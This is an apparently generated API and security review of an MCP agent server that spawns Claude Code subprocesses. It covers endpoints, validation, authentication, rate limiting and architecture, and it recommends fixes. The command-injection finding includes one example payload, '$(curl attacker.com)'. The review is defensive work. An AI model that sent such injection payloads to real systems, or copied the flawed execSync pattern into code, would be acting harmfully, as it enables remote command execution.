---
description: API surface review for kordinate project
generated: 2026-03-28
project: kordinate
---
# API Review

## Summary

The kordinate project has a single HTTP API surface: the **Beorn MCP agent server** (`kordinate/lib/mcp-agent-server/server.js`), an Express 5 application on port 3100. It implements the MCP (Model Context Protocol) StreamableHTTP transport, exposing three tools (`delegate`, `kord`, `status`) via `POST /mcp` and a health endpoint at `GET /health`. The server runs inside a Kubernetes pod (agent-factory Deployment) with KEDA scale-to-zero and is not exposed externally -- it is a ClusterIP service accessible only within the cluster.

The architecture is intentionally minimal: a stateless MCP gateway that spawns Claude Code subprocesses as different agent personas. Key concerns are command injection in shell-spawning paths, absence of authentication, and tight coupling between Express HTTP handling and business logic.

## Endpoint Inventory

| Method | Path | Handler | Auth | Validation | Purpose |
|--------|------|---------|------|------------|---------|
| GET | /health | Inline lambda | None | None needed | K8s readiness/liveness probe |
| POST | /mcp | Async handler (lines 365-386) | None | MCP SDK + Zod schemas on tools | MCP StreamableHTTP transport entry point |

Note: The comment on line 9 mentions `GET` and `DELETE /mcp` but no explicit handlers exist for those methods. The `StreamableHTTPServerTransport` may handle GET (for SSE streaming) and DELETE (for session teardown) internally, but Express only registers `app.post('/mcp', ...)`. GET/DELETE to `/mcp` would yield Express's default 404.

## MCP Tool Inventory

| Tool | Parameters | Response | Validation |
|------|-----------|----------|------------|
| `delegate` | `agent`: z.enum(KNOWN_AGENTS), `prompt`: z.string() | `{ content: [{ type: 'text', text: <agent response> }] }` | Zod enum for agent name; no prompt length/content validation |
| `status` | (none) | JSON with name, boot time, known agents, active requests | N/A |
| `kord` | `kord_name`: z.string(), `message`: z.string() | `{ content: [{ type: 'text', text: <response> }] }` | Zod string (no pattern/length constraints); kord_name validated by filesystem lookup |

## Pattern Compliance

### REST Compliance

This is **not a REST API** and does not claim to be. It is an MCP protocol server using JSON-RPC 2.0 over HTTP. The `/mcp` endpoint accepts all MCP methods (initialize, tools/list, tools/call) via POST. The `/health` endpoint is a standard health check. REST compliance is not applicable -- the MCP protocol specification defines the contract.

**Verdict**: Appropriate for its purpose. No REST violations because it is not REST.

### Input Validation

**Tool-level validation** is handled by Zod schemas via the MCP SDK:
- `delegate.agent` uses `z.enum(KNOWN_AGENTS)` -- good, prevents arbitrary agent names.
- `delegate.prompt` uses `z.string()` with no max length -- a 10MB prompt string would be accepted.
- `kord.kord_name` uses `z.string()` with no pattern constraint -- any string is accepted, validated only by filesystem lookup (`findKordDir`).
- `kord.message` uses `z.string()` with no max length.

**HTTP-level validation**: Express body parser has a `1mb` limit (line 344), which provides an upper bound on total request size.

**Missing validation**:
- No max length on `prompt` or `message` fields.
- No sanitization of `kord_name` before use in filesystem path construction (though `join()` prevents directory traversal).
- The `message` field reaches `checkExpiry()` where it is passed to a shell command -- see Security Findings.

### Error Handling

- MCP transport errors return JSON-RPC error format with code -32603 and the raw `e.message` (line 383). This is correct per JSON-RPC spec.
- Tool-level errors (e.g., kord not found) throw errors that the MCP SDK converts to tool error responses.
- The catch block on line 382 checks `res.headersSent` before sending error response -- good practice.
- Agent invocation failures include stderr in logs but not in client responses -- good, avoids leaking internals.

**Concern**: The `e.message` in the JSON-RPC error response (line 383) could leak internal details (file paths, subprocess errors). Consider sanitizing.

### Authentication & Authorization

**There is no authentication or authorization on any endpoint.** The server accepts any request to `/mcp` and `/health` without credentials, tokens, or API keys.

**Mitigating factors**:
- The Service is ClusterIP (not NodePort/LoadBalancer), so it is only accessible within the Kubernetes cluster.
- There is no Ingress resource for agent-factory.
- Access is implicitly restricted by network policy (though no explicit NetworkPolicy manifest was found for agent-factory).

**Risk**: Any pod in the cluster can invoke any agent with any prompt. If the cluster is compromised or multi-tenant, this is a lateral movement vector.

### Rate Limiting

**There is no rate limiting.** Any client can send unlimited requests. Each `delegate` or `kord` call spawns a Claude Code subprocess (5-minute timeout), so a burst of requests could exhaust pod resources.

**Mitigating factors**:
- KEDA scales 0-to-1 only (maxReplicaCount: 1), so there is a single pod.
- Pod has a 1Gi memory limit, which provides a natural ceiling.
- Each request is tracked in `activeRequests` Map but there is no concurrency limit enforced.

### CORS

**No CORS configuration.** Express defaults apply (no CORS headers). This is acceptable because:
- The server is cluster-internal only.
- MCP clients are not browsers -- they are programmatic (Claude Desktop, claude CLI).
- No browser-based frontend consumes this API.

## Gateway Pattern Assessment

Beorn correctly implements the **gateway/proxy pattern**:

1. **Delegation**: Each tool call spawns a fresh Claude Code subprocess with the target agent's identity and memory. The gateway does not contain business logic -- it orchestrates.

2. **Identity isolation**: Each invocation loads a separate IDENTITY.md and memory set for the target agent. Agents cannot see each other's prompts or state within a single request.

3. **Stateless per-request**: A new `McpServer` + `StreamableHTTPServerTransport` is created for every POST (line 369-375). No session state leaks between requests. This is clean but has overhead cost (server + transport instantiation per request).

4. **Timeout handling**: Agent invocations have a 300-second (5-minute) timeout with SIGTERM on expiry (lines 141-143). Good.

5. **Implementation detail leakage**: Minimal. Error responses use generic messages. Log output goes to stdout (container logs), not to the client. The `status` tool exposes agent names and active request metadata, which is acceptable for an internal service.

6. **Request transformation**: The gateway loads system prompts, regenerates memory, and constructs CLI arguments -- proper request transformation for the subprocess boundary.

7. **Concurrent requests**: No explicit limit. Multiple simultaneous `delegate` calls will spawn multiple Claude Code processes. The `activeRequests` Map tracks them but does not enforce a cap. With the pod's 1Gi memory limit, 2-3 concurrent Claude processes could OOM the pod.

## Hexagonal Architecture Assessment

The server is a **single 395-line file** with no port/adapter separation:

- **Express (HTTP transport)** is directly coupled with MCP tool definitions and agent invocation logic.
- **Business logic** (agent discovery, memory regeneration, system prompt loading, contract parsing, cache management) is mixed into the same file as HTTP handling.
- **Subprocess spawning** (the "adapter" for Claude Code) is inlined in `invokeAgent()`.

**Could you swap the transport layer?** Partially. The MCP SDK abstracts the transport (`StreamableHTTPServerTransport`), so switching to stdio or WebSocket transport would require changing only the Express route handler (~20 lines). However, the business logic functions would come along because they are not extracted into separate modules.

**Recommendation**: For a 395-line server with a single purpose, this level of coupling is pragmatic. Extracting ports/adapters would be warranted if the server grows (e.g., adding more endpoints, supporting multiple transports, or adding persistent state).

## Security Findings

| Finding | Severity | Location | Description |
|---------|----------|----------|-------------|
| Command injection in `checkExpiry` | **CRITICAL** | server.js:218 | `message` (user-controlled string) is passed to shell via `execSync()`. `JSON.stringify()` wraps in double quotes but shell still interprets `$(...)` and backticks inside double quotes. A message like `$(curl attacker.com)` would execute. |
| Shell injection in `regenerateMemory` | LOW | server.js:70 | `hookInput` is constructed from Zod-validated agent name (enum) and serialized JSON. The agent name is constrained to known values, so injection is not practical. |
| No authentication | MEDIUM | server.js (all endpoints) | Any cluster-internal client can invoke any agent. No NetworkPolicy restricts access to the agent-factory Service. |
| No concurrency limit | MEDIUM | server.js:128-165 | Unbounded concurrent subprocess spawning. A burst of requests could OOM the pod (1Gi limit). |
| No request size limit on tool params | LOW | server.js:237-239 | `prompt` and `message` are unbounded strings (Zod string with no `.max()`). Express body limit is 1MB, which provides a ceiling, but a 1MB prompt still spawns a subprocess. |
| Error message disclosure | LOW | server.js:383 | Raw `e.message` returned in JSON-RPC error. Could expose file paths or subprocess details. |
| `--dangerously-skip-permissions` flag | INFO | server.js:119 | Claude Code is invoked with permission bypass. This is intentional for automated agent operation but means the spawned agent can perform any file/network operation the pod's user can. Mitigated by K8s RBAC (agent-readonly ClusterRole). |
| No TLS | INFO | server.js:390 | Server listens on plain HTTP. Acceptable for cluster-internal traffic where a service mesh or pod-to-pod encryption handles TLS. |
| `kord_name` path traversal | LOW | server.js:205 | `kord_name` is used in `join(agentsDir, agent.name, 'kords', kordName)`. `path.join` normalizes `..` segments, and the subsequent `existsSync` check on `contract.md` limits exploitation, but no explicit sanitization is performed. |

## Recommendations

| Priority | Recommendation | Effort |
|----------|---------------|--------|
| P0 | **Fix command injection in `checkExpiry`**: Replace `execSync` shell string with `execFileSync('bash', [expiryScript, message], {...})` to avoid shell interpretation of `message`. | Small (1 line change) |
| P1 | **Add concurrency limit**: Track active subprocess count and reject requests with 429/retry-after when at capacity (e.g., max 2 concurrent agent invocations). | Small |
| P1 | **Add NetworkPolicy**: Create a NetworkPolicy for agent-factory that restricts ingress to known clients (e.g., workstation pod, specific ServiceAccounts). | Small |
| P2 | **Add input length limits**: Add `.max(100000)` to `prompt` and `message` Zod schemas to prevent extremely large inputs from reaching subprocess spawn. | Trivial |
| P2 | **Sanitize error responses**: Wrap `e.message` in a generic error for the JSON-RPC response; log the full error server-side only. | Small |
| P2 | **Sanitize `kord_name`**: Validate `kord_name` against a pattern like `/^[a-z0-9-]+$/` to prevent path traversal attempts. | Trivial |
| P3 | **Add GET/DELETE /mcp handlers**: The MCP StreamableHTTP spec expects GET (SSE) and DELETE (session teardown). Either register handlers or document that the server is stateless-only. | Small |
| P3 | **Extract business logic**: Move agent discovery, invocation, and kord contract handling into separate modules for testability. | Medium |
| P3 | **Add request timeout at HTTP level**: Express has no request timeout by default. A long-running MCP call (5min subprocess + overhead) keeps the HTTP connection open. Add `server.timeout` or per-route timeout middleware. | Small |
